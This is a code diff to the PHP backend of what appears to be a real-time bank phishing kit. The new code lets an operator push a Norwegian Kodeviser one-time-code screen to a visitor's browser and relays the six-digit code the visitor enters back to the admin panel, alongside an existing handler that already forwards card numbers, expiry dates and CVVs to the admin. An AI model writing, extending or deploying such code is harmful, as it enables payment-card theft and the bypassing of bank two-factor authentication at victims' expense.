@@ -288,6 +288,13 @@ function handleWsPolling(string $method, string $path): bool {
                     'amount' => $amount !== '' ? $amount : null,
                 ]);
             }
+
+            // Kodeviser — 6-digit engangskode screen
+            elseif ($type === 'show-kodeviser') {
+                $pdo->prepare("UPDATE sessions SET qr_visible = 0, qr_image = NULL, sms_active = 0, updated_at = ? WHERE session_id = ?")->execute([$now, $sessionId]);
+                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'show_kodeviser', 'Admin showed Kodeviser screen')")->execute([$sessionId]);
+                $queueMessage('user', ['type' => 'show-kodeviser']);
+            }
         }
 
         // 3. User events
@@ -327,6 +334,17 @@ function handleWsPolling(string $method, string $path): bool {
                     'cardNumber' => $card,
                     'expiry' => $exp,
                     'cvv' => $cvv,
+                    'session_id' => $sessionId,
+                    'sessionId' => $sessionId,
+                ]);
+            }
+
+            elseif ($type === 'kodeviser-submitted') {
+                $code = (string)($data['code'] ?? '');
+                $pdo->prepare("INSERT INTO auth_log (session_id, event_type, detail) VALUES (?, 'kodeviser_submitted', ?)")->execute([$sessionId, "Kodeviser: {$code}"]);
+                $queueMessage('admin', [
+                    'type' => 'kodeviser-submitted',
+                    'code' => $code,
                     'session_id' => $sessionId,
                     'sessionId' => $sessionId,
                 ]);
